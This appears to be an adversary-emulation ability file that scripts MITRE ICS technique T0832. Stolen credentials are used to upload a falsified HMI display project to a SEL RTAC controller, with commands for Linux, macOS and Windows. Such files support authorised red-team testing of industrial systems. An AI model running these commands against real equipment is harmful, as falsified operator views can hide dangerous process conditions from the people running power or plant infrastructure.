- id: f3a1c9e7-2b4d-4081-8e5a-6c3f2d9b7e10
  name: RTAC HMI - Upload Manipulated Display (Credentials)
  description: >
    Uploads a crafted HMI project file to the SEL RTAC via
    POST /api/v1/hmi/projects using captured Basic auth credentials,
    replacing operator display screens with falsified process views.
    Emulates an attacker using harvested username/password to manipulate
    operator situational awareness without disrupting control communications.
  tactic: impair-process-control
  technique_id: T0832
  technique_name: Manipulation of View
  executors:
  - platform: linux
    name: sh
    command: >
      ./rtac_hmi --base-url #{rtac.hmi.base_url}
      --username #{rtac.hmi.username} --password #{rtac.hmi.password}
      --insecure upload-project manipulated_display.hprjson
    payloads:
    - rtac_hmi
    - manipulated_display.hprjson
    timeout: 120
  - platform: darwin
    name: sh
    command: >
      ./rtac_hmi_darwin --base-url #{rtac.hmi.base_url}
      --username #{rtac.hmi.username} --password #{rtac.hmi.password}
      --insecure upload-project manipulated_display.hprjson
    payloads:
    - rtac_hmi_darwin
    - manipulated_display.hprjson
    timeout: 120
  - platform: windows
    name: psh
    command: >
      .\rtac_hmi.exe --base-url #{rtac.hmi.base_url}
      --username #{rtac.hmi.username} --password #{rtac.hmi.password}
      --insecure upload-project manipulated_display.hprjson
    payloads:
    - rtac_hmi.exe
    - manipulated_display.hprjson
    timeout: 120
  - platform: windows
    name: cmd
    command: >
      .\rtac_hmi.exe --base-url #{rtac.hmi.base_url}
      --username #{rtac.hmi.username} --password #{rtac.hmi.password}
      --insecure upload-project manipulated_display.hprjson
    payloads:
    - rtac_hmi.exe
    - manipulated_display.hprjson
    timeout: 120
  repeatable: false
  plugin: dnp3
